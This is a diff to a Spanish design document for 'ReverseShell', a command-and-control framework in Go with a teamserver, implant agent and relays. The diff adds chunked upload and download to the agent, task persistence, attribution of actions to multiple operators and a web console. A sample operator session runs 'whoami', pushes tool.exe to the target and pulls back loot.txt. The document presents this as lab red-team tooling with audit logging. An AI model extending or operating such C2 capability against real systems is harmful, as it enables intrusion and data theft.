@@ -397,15 +397,18 @@ y un frontend web (React/Vue) mañana — **sin cambios en el teamserver**.
 | Método | Ruta | Cuerpo / Respuesta | Descripción |
 |---|---|---|---|
 | `GET` | `/v1/sessions` | → lista con `sid`, peer, os, estado, `last_seen` | Sesiones activas |
-| `GET` | `/v1/sessions/{sid}` | → detalle + tareas recientes | Detalle de sesión |
 | `POST` | `/v1/sessions/{sid}/tasks` | `{kind, args, timeout}` → `202 {tid}` | Crea una tarea |
+| `POST` | `/v1/sessions/{sid}/upload?path=` | body crudo → `202 {tid, chunks, sha256}` | Subida troceada al agent |
 | `GET` | `/v1/tasks/{tid}` | → estado y resultado | Resultado de una tarea |
-| `DELETE` | `/v1/sessions/{sid}` | → `204` | Cierra la sesión (envía `BYE`) |
+| `GET` | `/v1/tasks/{tid}/download` | → bytes + header `X-RS-SHA256` | Payload ensamblado de una descarga |
 | `GET` | `/v1/events` | → stream SSE | Eventos en tiempo real (ver abajo) |
 | `POST` | `/v1/shutdown` | → `202` | Apagado limpio del teamserver (auditado) |
+| `GET` | `/ui` | → HTML | Consola web single-file sobre esta misma API |
 
 **Autenticación**: `Authorization: Bearer <operator_token>` en cada request. Token en
 `config.toml` (gitignored). Sin token o inválido → `401` + evento en el log de auditoría.
+El header opcional `X-RS-Operator` nombra al operador y viaja a la auditoría
+(`operator.task`, `operator.upload`) — atribución multi-operador.
 
 **Bind**: `127.0.0.1` por defecto. Exponer el operator API a una red (p. ej. para una
 consola remota en el laboratorio) exige flag explícito **y** TLS.
@@ -419,9 +422,16 @@ event: session.stale     data: {"sid":"b3f1..."}
 ```
 
 **Retención de resultados**: el contenido de los RESULT se mantiene **en memoria** en el
-teamserver (buffer acotado por sesión) para que el operador lo recupere por
-`GET /v1/tasks/{tid}` o por SSE. El **audit log solo registra metadatos** (§9.3) — la
-funcionalidad del operador y la accountability quedan separadas por diseño.
+teamserver para que el operador lo recupere por `GET /v1/tasks/{tid}` o por SSE. El
+**audit log solo registra metadatos** (§9.3) — la funcionalidad del operador y la
+accountability quedan separadas por diseño.
+
+**Persistencia (F5)**: la cola de tasks y el mapa `nonce→sid` se persisten como JSONL
+(`[tasks] store`, gitignored, default `logs/tasks.jsonl`). Tras un restart del
+teamserver, un agent que reconecta retoma su sesión por nonce y las tasks pendientes
+se re-entregan (at-least-once). Los payloads descargados viven solo en memoria; los
+chunks de upload pendientes sí persisten —son el archivo del operador— para poder
+re-entregarse.
 
 **Decisión de diseño — REST+SSE vs gRPC**: gRPC (como Sliver) ofrece contract-first y
 streams bidireccionales, pero requiere protobuf + grpc-go — rompe el stdlib-first y
@@ -480,6 +490,13 @@ rs[b3f1a2c9d0e8]> exec whoami
 [77c2e4a1] ok (41 ms)
  desktop-abc\labuser
 rs[b3f1a2c9d0e8]> sysinfo
+rs[b3f1a2c9d0e8]> upload tool.exe C:\lab\tool.exe
+[upload] 8123 bytes → C:\lab\tool.exe (1 chunk(s), sha256 3fa1b2c9d0e8…)
+[4b21c3d4] upload (12 ms)
+  status: ok exit=0
+  written 8123 bytes, sha256 verified
+rs[b3f1a2c9d0e8]> download C:\lab\loot.txt loot.txt
+[download] C:\lab\loot.txt → loot.txt (234 bytes, sha256 verified)
 rs[b3f1a2c9d0e8]> kill
 [9f01e2ab] exit task queued
 rs[b3f1a2c9d0e8]> back
@@ -568,7 +585,7 @@ Toda acción del operador y todo evento de sesión queda registrado con timestam
 ```json
 {"ts":"2026-11-12T10:00:01Z","event":"listener.start","bind":"127.0.0.1:4444","transport":"tcp"}
 {"ts":"2026-11-12T10:00:04Z","event":"session.register","sid":"b3f1a2c9d0e8","src":"127.0.0.1:52411","agent":{"os":"windows","user":"labuser"}}
-{"ts":"2026-11-12T10:00:31Z","event":"operator.task","sid":"b3f1a2c9d0e8","tid":"77c2e4a1","kind":"shell","cmd":"whoami"}
+{"ts":"2026-11-12T10:00:31Z","event":"operator.task","sid":"b3f1a2c9d0e8","tid":"77c2e4a1","operator":"alice","kind":"shell","cmd":"whoami"}
 {"ts":"2026-11-12T10:00:32Z","event":"session.result","sid":"b3f1a2c9d0e8","tid":"77c2e4a1","status":"ok","exit_code":0,"result_bytes":21}
 {"ts":"2026-11-12T10:05:00Z","event":"session.stale","sid":"b3f1a2c9d0e8"}
 ```
@@ -626,12 +643,14 @@ ReverseShell/
 │   ├── server/
 │   │   ├── server.go          # núcleo teamserver; implementa api.Backend
 │   │   ├── listener.go        # accept loop + handleConn + writeLoop
-│   │   ├── dispatcher.go      # + dispatcher_test.go
+│   │   ├── dispatcher.go      # + dispatcher_test.go — tasks, uploads, chunks
+│   │   ├── store.go           # persistencia JSONL: tasks + nonces (F5)
 │   │   ├── audit.go           # slog JSON → JSONL con el shape de §9.3
 │   │   ├── events.go          # EventBus → SSE
 │   │   └── e2e_test.go        # e2e loopback (criterio de aceptación F1)
 │   ├── api/
-│   │   └── api.go             # + api_test.go (httptest) — REST+SSE + auth bearer
+│   │   ├── api.go             # + api_test.go (httptest) — REST+SSE + auth bearer
+│   │   └── ui/index.html      # consola web single-file servida en /ui
 │   ├── relay/
 │   │   └── relay.go           # + relay_test.go — plano relay: HELLO, SESSION_UP/DOWN, FRAME_RELAY
 │   ├── agent/
@@ -803,7 +822,7 @@ go run ./cmd/agent --host <edge-host> --port 4444
 | **F2** | Completada | Robustez de sesiones: HEARTBEAT/ACK, reconexión backoff+jitter, resume por nonce, STALE, audit JSONL completo, requeue de tasks, `exit` | Matar el agent y verlo retomar la misma sesión; la auditoría reproduce la sesión completa |
 | **F3** | Completada | Hardening: TLS en plano de sesiones, HMAC del implant, TLS+token del operator API fuera de loopback | Conexión sin credenciales rechazada y auditada en ambos planos |
 | **F4** | Completada | Transport HTTP(S) del implant + `cmd/listener` remoto (relay sobre TLS) | Un listener remoto en otro host del laboratorio alimenta al teamserver central |
-| **F5** | Pendiente | `upload`/`download` con troceado+checksum, persistencia de tasks, multi-operador, web frontend (React/Vue) sobre la misma API | Archivo íntegro verificado por hash; dos operadores concurrentes sin interferirse |
+| **F5** | Completada | `upload`/`download` con troceado+checksum, persistencia de tasks y sesiones, multi-operador con atribución en auditoría, consola web single-file en `/ui` (React/Vue puede consumir la misma API como proyecto aparte) | Archivo íntegro verificado por hash; dos operadores concurrentes sin interferirse |
 
 ---
 
